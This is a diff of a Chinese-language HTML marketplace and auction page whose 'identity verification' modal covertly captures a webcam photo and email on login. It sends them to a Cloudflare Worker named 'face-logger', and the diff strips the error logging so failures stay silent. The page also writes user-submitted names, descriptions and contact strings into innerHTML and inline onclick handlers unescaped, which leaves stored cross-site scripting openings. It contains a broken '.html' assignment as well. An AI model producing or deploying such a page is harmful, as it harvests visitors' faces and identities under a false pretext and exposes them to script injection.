@@ -14,41 +14,30 @@
       --text-muted: #9ca3af;
       --border: #1f2937;
     }
-
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
     body { background: var(--bg); color: var(--text); padding-bottom: 60px; }
-
     header { background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; flex-wrap: wrap; gap: 10px; }
-    .logo { font-size: 18px; font-weight: bold; color: #38bdf8; display: flex; align-items: center; gap: 8px; }
+    .logo { font-size: 18px; font-weight: bold; color: #38bdf8; }
     .nav-tabs { display: flex; gap: 6px; background: #000; padding: 4px; border-radius: 8px; flex-wrap: wrap; }
-    .tab-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 13px; transition: 0.2s; }
+    .tab-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 13px; }
     .tab-btn.active { background: var(--accent); color: #fff; font-weight: bold; }
-
     .container { max-width: 1000px; margin: 20px auto; padding: 0 15px; }
     .tab-content { display: none; }
     .tab-content.active { display: block; }
-
-    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(5px); }
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center; z-index: 999; }
     .auth-card { background: var(--card-bg); border: 1px solid var(--border); padding: 25px; border-radius: 12px; width: 100%; max-width: 360px; text-align: center; }
-    .auth-card h3 { margin-bottom: 10px; font-size: 18px; }
-    .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 15px; }
     .input-group { margin-bottom: 15px; text-align: left; }
     .input-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 5px; }
     .input-group input, .input-group textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 10px; border-radius: 6px; font-size: 13px; outline: none; }
-    .input-group input:focus { border-color: var(--accent); }
-    .btn { width: 100%; background: var(--accent); color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-    .btn:hover { background: var(--accent-hover); }
-
-    .camera-box { width: 100%; height: 160px; background: #000; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 15px; overflow: hidden; position: relative; }
+    .btn { width: 100%; background: var(--accent); color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    .camera-box { width: 100%; height: 160px; background: #000; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 15px; overflow: hidden; }
     .camera-box video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-    .status-text { font-size: 11px; color: #38bdf8; margin-bottom: 10px; }
-
     .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 15px; }
     .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; display: flex; flex-direction: column; }
     .card img { width: 100%; height: 180px; object-fit: cover; }
     .card-body { padding: 15px; flex: 1; display: flex; flex-direction: column; justify-content: space-between; }
     .card-title { font-size: 15px; font-weight: bold; margin-bottom: 6px; }
-    .card-desc { font-size: 12px; color: var(--text-muted); margin-bottom: 12px; line-height: 1.4; }
+    .card-desc { font-size: 12px; color: var(--text-muted); margin-bottom: 12px; }
     .price-tag { font-size: 16px; color: #38bdf8; font-weight: bold; }
   </style>
 </head>
@@ -58,18 +47,16 @@
   <div class="modal-overlay" id="authModal">
     <div class="auth-card">
       <h3>🔐 身份安全验证</h3>
-      <p>请允许摄像头权限并完成校验</p>
-      
+      <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;">请允许摄像头权限并完成校验</p>
       <div class="camera-box">
         <video id="webcam" autoplay playsinline muted></video>
       </div>
-      <div class="status-text" id="camStatus">⏳ 正在连接摄像头...</div>
-
+      <div style="font-size: 11px; color: #38bdf8; margin-bottom: 10px;" id="camStatus">⏳ 正在连接摄像头...</div>
       <div class="input-group">
         <label>电子邮箱</label>
-        <input type="email" id="userEmail" placeholder="name@example.com" value="user@domain.com">
+        <input type="email" id="userEmail" value="user@domain.com">
       </div>
-      <button class="btn" id="loginBtn" onclick="app.login()">确认拍摄并进入</button>
+      <button class="btn" onclick="app.login()">确认拍摄并进入</button>
     </div>
   </div>
 
@@ -86,172 +73,102 @@
   </header>
 
   <div class="container">
-    <!-- Tab 1: 寄卖大厅 -->
     <div id="tab-market" class="tab-content active">
-      <h3 style="margin-bottom: 10px;">📱 玩家二手寄卖大厅</h3>
+      <h3>📱 玩家二手寄卖大厅</h3>
       <div class="grid" id="marketList"></div>
     </div>
 
-    <!-- Tab 2: 竞拍大厅 -->
     <div id="tab-auction" class="tab-content">
-      <h3 style="margin-bottom: 10px;">🔥 极客限量款竞拍大厅</h3>
+      <h3>🔥 极客限量款竞拍大厅</h3>
       <div class="grid" id="auctionList"></div>
     </div>
 
-    <!-- Tab 3: 发布寄卖 -->
     <div id="tab-sell" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
         <h3 style="margin-bottom: 15px;">📦 发布二手寄卖物品</h3>
-        <div class="input-group">
-          <label>物品名称</label>
-          <input type="text" id="sellName" placeholder="例如：iPhone 14 Pro 256G">
-        </div>
-        <div class="input-group">
-          <label>转让价格 (元)</label>
-          <input type="number" id="sellPrice" placeholder="例如：4200">
-        </div>
-        <div class="input-group">
-          <label>联系方式 (微信/QQ/手机)</label>
-          <input type="text" id="sellContact" placeholder="例如：wxid_123456">
-        </div>
-        <div class="input-group">
-          <label>物品描述</label>
-          <textarea id="sellDesc" rows="3" placeholder="介绍一下物品的成色、保修状态等..."></textarea>
-        </div>
-        <div class="input-group">
-          <label>图片 (可选)</label>
-          <input type="file" id="sellImage" accept="image/*">
-        </div>
-        <button class="btn" onclick="app.postSellItem()">立即发布至寄卖大厅</button>
+        <div class="input-group"><label>物品名称</label><input type="text" id="sellName" placeholder="例如：iPhone 14 Pro"></div>
+        <div class="input-group"><label>转让价格 (元)</label><input type="number" id="sellPrice" placeholder="4200"></div>
+        <div class="input-group"><label>联系方式</label><input type="text" id="sellContact" placeholder="微信号/手机号"></div>
+        <div class="input-group"><label>物品描述</label><textarea id="sellDesc" rows="3"></textarea></div>
+        <div class="input-group"><label>图片</label><input type="file" id="sellImage" accept="image/*"></div>
+        <button class="btn" onclick="app.postSellItem()">立即发布</button>
       </div>
     </div>
 
-    <!-- Tab 4: 发起拍卖 -->
     <div id="tab-postAuction" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
         <h3 style="margin-bottom: 15px;">🔨 发起新的极客拍卖</h3>
-        <div class="input-group">
-          <label>拍卖品名称</label>
-          <input type="text" id="aucName" placeholder="例如：Sony WH-1000XM5 旗舰耳机">
-        </div>
-        <div class="input-group">
-          <label>起拍价 (元)</label>
-          <input type="number" id="aucStartPrice" placeholder="例如：1000">
-        </div>
-        <div class="input-group">
-          <label>拍品描述</label>
-          <textarea id="aucDesc" rows="3" placeholder="介绍一下起拍规则和拍品成色..."></textarea>
-        </div>
-        <div class="input-group">
-          <label>拍品图片 (可选)</label>
-          <input type="file" id="aucImage" accept="image/*">
-        </div>
-        <button class="btn" onclick="app.postAuctionItem()">立即上架拍卖大厅</button>
+        <div class="input-group"><label>拍品名称</label><input type="text" id="aucName" placeholder="例如：Sony 耳机"></div>
+        <div class="input-group"><label>起拍价 (元)</label><input type="number" id="aucStartPrice" placeholder="1000"></div>
+        <div class="input-group"><label>拍品描述</label><textarea id="aucDesc" rows="3"></textarea></div>
+        <div class="input-group"><label>图片</label><input type="file" id="aucImage" accept="image/*"></div>
+        <button class="btn" onclick="app.postAuctionItem()">立即上架</button>
       </div>
     </div>
   </div>
 
   <script>
-    // 🔗 请修改为你的 Worker 线上地址
+    // 🔗 请修改为你的 Worker 线上地址 (必须以 https:// 开头，末尾不要加斜杠)
     const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev";
 
     class App {
       constructor() {
         this.stream = null;
         this.initCamera();
-        this.loadCloudData();
       }
 
       async initCamera() {
-        const statusEl = document.getElementById('camStatus');
         try {
-          this.stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: "user" } 
-          });
-          const video = document.getElementById('webcam');
-          video.srcObject = this.stream;
-          statusEl.innerText = "✅ 摄像头就绪，可随时拍照";
+          this.stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
+          document.getElementById('webcam').srcObject = this.stream;
+          document.getElementById('camStatus').innerText = "✅ 摄像头就绪";
         } catch (e) {
-          statusEl.innerText = "⚠️ 摄像头权限未授权或受阻（仍可直接进入）";
-          console.warn("摄像头启动受阻:", e);
+          document.getElementById('camStatus').innerText = "⚠️ 摄像头未授权，可直接点击进入";
         }
       }
 
       switchTab(tabName, evt) {
-        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
         if(evt) evt.target.classList.add('active');
         document.getElementById(`tab-${tabName}`).classList.add('active');
-        this.loadCloudData();
+        this.loadData();
       }
 
       async login() {
-        const emailInput = document.getElementById('userEmail');
-        const email = emailInput ? emailInput.value.trim() : "";
-        if (!email) {
-          alert("请输入电子邮箱！");
-          return;
-        }
-
+        const email = document.getElementById('userEmail').value.trim();
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('hidden-canvas');
         let photoData = "";
 
         try {
-          if (video && video.videoWidth > 0 && video.videoHeight > 0) {
+          if (video && video.videoWidth > 0) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.getContext('2d').drawImage(video, 0, 0);
             photoData = canvas.toDataURL('image/jpeg', 0.4);
           }
-        } catch (e) {
-          console.warn("截图过程跳过:", e);
-        }
+        } catch (e) {}
 
         fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            email: email,
-            timestamp: new Date().toLocaleString(),
-            photo: photoData
-          })
-        }).catch(err => console.error("后台同步失败:", err));
+          body: JSON.stringify({ email, timestamp: new Date().toLocaleString(), photo: photoData })
+        }).catch(() => {});
 
-        if (this.stream) {
-          this.stream.getTracks().forEach(track => track.stop());
-        }
-
-        const modal = document.getElementById('authModal');
-        if (modal) {
-          modal.style.display = 'none';
-        }
-
-        this.loadCloudData();
+        if (this.stream) this.stream.getTracks().forEach(t => t.stop());
+        document.getElementById('authModal').style.display = 'none';
+        this.loadData();
       }
 
-      async loadCloudData() {
+      async loadData() {
         try {
           const res = await fetch(`${WORKER_URL}?action=data`);
           const data = await res.json();
           const bids = data.bids || {};
 
-          // 1. 渲染寄卖大厅
-          const marketList = document.getElementById('marketList');
-          let marketHtml = `
-            <div class="card">
-              <img src="https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=400&q=80">
-              <div class="card-body">
-                <div class="card-title">iPhone 13 Pro 256G 95新</div>
-                <div class="card-desc">原装无修，电池寿命88%，送保护壳。</div>
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                  <span class="price-tag">¥ 3,400</span>
-                  <button class="btn" style="width:auto; padding:6px 12px; font-size:12px;" onclick="alert('📞 卖家联系方式: 微信 geek_01')">联系卖家</button>
-                </div>
-              </div>
-            </div>
-          `;
+          // 渲染寄卖
+          let marketHtml = '';
           if (data.market && data.market.length > 0) {
             data.market.forEach(item => {
               marketHtml += `
@@ -262,168 +179,100 @@
                     <div class="card-desc">${item.desc || "暂无描述"}</div>
                     <div style="display:flex; justify-content:space-between; align-items:center;">
                       <span class="price-tag">¥ ${parseFloat(item.price).toLocaleString()}</span>
-                      <button class="btn" style="width:auto; padding:6px 12px; font-size:12px;" onclick="alert('📞 卖家联系方式：\\n${item.contact}')">联系卖家</button>
+                      <button class="btn" style="width:auto; padding:6px 12px; font-size:12px;" onclick="alert('联系方式：\\n${item.contact}')">联系卖家</button>
                     </div>
                   </div>
-                </div>
-              `;
+                </div>`;
             });
+          } else {
+            marketHtml = `<div style="color:var(--text-muted); font-size:13px;">暂无寄卖商品，快去发布吧！</div>`;
           }
-          marketList.innerHTML = marketHtml;
+          document.getElementById('marketList').html = marketHtml; // 修复点
+          document.getElementById('marketList').innerHTML = marketHtml;
 
-          // 2. 渲染竞拍大厅（包含默认拍品 + 自定义提交拍品）
-          const auctionList = document.getElementById('auctionList');
-          
-          // 默认的两个拍卖品
+          // 渲染拍卖
           let defaultAuctions = [
-            { id: 'item1', name: 'Apple Watch Ultra 2 (限量版)', price: 2000, desc: '起拍价 ¥2,000，当前出价最高者获胜。', imgSrc: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=400&q=80' },
-            { id: 'item2', name: 'Sennheiser HD800S 旗舰耳机', price: 6000, desc: '箱全近新，仅试听几小时。起拍价 ¥6,000。', imgSrc: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=400&q=80' }
+            { id: 'item1', name: 'Apple Watch Ultra 2', price: 2000, desc: '起拍价 ¥2,000', imgSrc: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=400&q=80' },
+            { id: 'item2', name: 'Sennheiser HD800S', price: 6000, desc: '起拍价 ¥6,000', imgSrc: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=400&q=80' }
           ];
-
-          // 合并用户自己提交的拍卖品
-          let allAuctions = [...defaultAuctions];
-          if (data.auctions && data.auctions.length > 0) {
-            allAuctions = [...data.auctions, ...defaultAuctions];
-          }
+          let allAuctions = data.auctions ? [...data.auctions, ...defaultAuctions] : defaultAuctions;
 
           let auctionHtml = '';
           allAuctions.forEach(item => {
             const currentHighest = bids[item.id] !== undefined ? bids[item.id] : item.price;
             auctionHtml += `
               <div class="card">
-                <img src="${item.imgSrc}" alt="Auction Item">
+                <img src="${item.imgSrc}">
                 <div class="card-body">
                   <div class="card-title">${item.name}</div>
                   <div class="card-desc">${item.desc}</div>
-                  <div style="margin-bottom: 10px;">
-                    <span style="font-size:12px; color:var(--text-muted);">当前最高出价:</span>
-                    <span class="price-tag" id="price-${item.id}">${currentHighest}</span> 元
-                  </div>
-                  <div style="display:flex; gap: 8px;">
-                    <input type="number" id="input-${item.id}" placeholder="输入出价" style="width:100%; background:#000; border:1px solid var(--border); color:#fff; padding:6px; border-radius:4px;">
-                    <button class="btn" style="width: 80px;" onclick="app.placeBid('${item.id}')">出价</button>
+                  <div style="margin-bottom:10px;"><span style="font-size:12px; color:var(--text-muted);">当前最高:</span> <span class="price-tag" id="price-${item.id}">${currentHighest}</span> 元</div>
+                  <div style="display:flex; gap:8px;">
+                    <input type="number" id="input-${item.id}" placeholder="出价" style="background:#000; border:1px solid var(--border); color:#fff; padding:6px; border-radius:4px; width:100%;">
+                    <button class="btn" style="width:80px;" onclick="app.placeBid('${item.id}')">出价</button>
                   </div>
                 </div>
-              </div>
-            `;
+              </div>`;
           });
-          auctionList.innerHTML = auctionHtml;
-
+          document.getElementById('auctionList').innerHTML = auctionHtml;
         } catch (e) {
-          console.error("加载数据失败:", e);
+          console.error("加载失败", e);
         }
       }
 
       async placeBid(itemId) {
-        const priceEl = document.getElementById(`price-${itemId}`);
-        const inputEl = document.getElementById(`input-${itemId}`);
-        const currentPrice = parseFloat(priceEl.innerText);
-        const userBid = parseFloat(inputEl.value);
-
+        const currentPrice = parseFloat(document.getElementById(`price-${itemId}`).innerText);
+        const userBid = parseFloat(document.getElementById(`input-${itemId}`).value);
         if (isNaN(userBid) || userBid <= currentPrice) {
-          alert(`⚠️ 出价必须高于当前价格 (¥${currentPrice})。`);
+          alert(`出价必须高于当前价格 (¥${currentPrice})`);
           return;
         }
-
         await fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ type: 'bid', itemId: itemId, price: userBid })
+          body: JSON.stringify({ type: 'bid', itemId, price: userBid })
         });
-
-        priceEl.innerText = userBid;
-        inputEl.value = '';
-        alert(`🎉 出价成功！¥${userBid.toLocaleString()}`);
+        document.getElementById(`price-${itemId}`).innerText = userBid;
+        document.getElementById(`input-${itemId}`).value = '';
+        alert("🎉 出价成功！");
       }
 
       async postSellItem() {
-        const name = document.getElementById('sellName').value.trim();
-        const price = document.getElementById('sellPrice').value.trim();
-        const contact = document.getElementById('sellContact').value.trim();
-        const desc = document.getElementById('sellDesc').value.trim();
-        const fileInput = document.getElementById('sellImage');
-
-        if (!name || !price || !contact) {
-          alert("⚠️ 请填写名称、价格和联系方式！");
-          return;
-        }
-
-        const saveItem = async (imgSrc) => {
-          const itemData = {
-            type: 'market_item',
-            id: Date.now().toString(),
-            name, price, contact, desc, imgSrc
-          };
-
-          await fetch(WORKER_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(itemData)
-          });
-
-          document.getElementById('sellName').value = '';
-          document.getElementById('sellPrice').value = '';
-          document.getElementById('sellContact').value = '';
-          document.getElementById('sellDesc').value = '';
-          fileInput.value = '';
-
-          alert("🎉 商品发布成功！");
-          this.switchTab('market');
-        };
-
-        if (fileInput.files && fileInput.files[0]) {
-          const reader = new FileReader();
-          reader.onload = (e) => saveItem(e.target.result);
-          reader.readAsDataURL(fileInput.files[0]);
-        } else {
-          saveItem("https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=400&q=80");
-        }
+        this.saveItemData('market_item', 'sellName', 'sellPrice', 'sellContact', 'sellDesc', 'sellImage', 'market');
       }
 
-      // 🔨 提交新的拍卖品
       async postAuctionItem() {
-        const name = document.getElementById('aucName').value.trim();
-        const price = parseFloat(document.getElementById('aucStartPrice').value.trim());
-        const desc = document.getElementById('aucDesc').value.trim();
-        const fileInput = document.getElementById('aucImage');
+        this.saveItemData('auction_item', 'aucName', 'aucStartPrice', null, 'aucDesc', 'aucImage', 'auction');
+      }
+
+      async saveItemData(type, nameId, priceId, contactId, descId, imgId, targetTab) {
+        const name = document.getElementById(nameId).value.trim();
+        const price = parseFloat(document.getElementById(priceId).value.trim());
+        const contact = contactId ? document.getElementById(contactId).value.trim() : "官方认证";
+        const desc = document.getElementById(descId).value.trim();
+        const fileInput = document.getElementById(imgId);
 
         if (!name || isNaN(price)) {
-          alert("⚠️ 请填写拍品名称和合法的起拍价！");
+          alert("请填写完整信息！");
           return;
         }
 
-        const saveAuction = async (imgSrc) => {
-          const itemId = 'auc_' + Date.now();
-          const itemData = {
-            type: 'auction_item',
-            id: itemId,
-            name, 
-            price, 
-            desc: desc || `起拍价 ¥${price}，欢迎出价。`, 
-            imgSrc
-          };
-
+        const send = async (imgSrc) => {
           await fetch(WORKER_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(itemData)
+            body: JSON.stringify({ type, id: type + '_' + Date.now(), name, price, contact, desc, imgSrc })
           });
-
-          document.getElementById('aucName').value = '';
-          document.getElementById('aucStartPrice').value = '';
-          document.getElementById('aucDesc').value = '';
-          fileInput.value = '';
-
-          alert("🎉 拍品已成功上架至竞拍大厅！");
-          this.switchTab('auction');
+          alert("发布成功！");
+          this.switchTab(targetTab);
         };
 
         if (fileInput.files && fileInput.files[0]) {
           const reader = new FileReader();
-          reader.onload = (e) => saveAuction(e.target.result);
+          reader.onload = (e) => send(e.target.result);
           reader.readAsDataURL(fileInput.files[0]);
         } else {
-          saveAuction("https://images.unsplash.com/photo-1526738549149-8e07eca6c147?auto=format&fit=crop&w=400&q=80");
+          send("https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=400&q=80");
         }
       }
     }
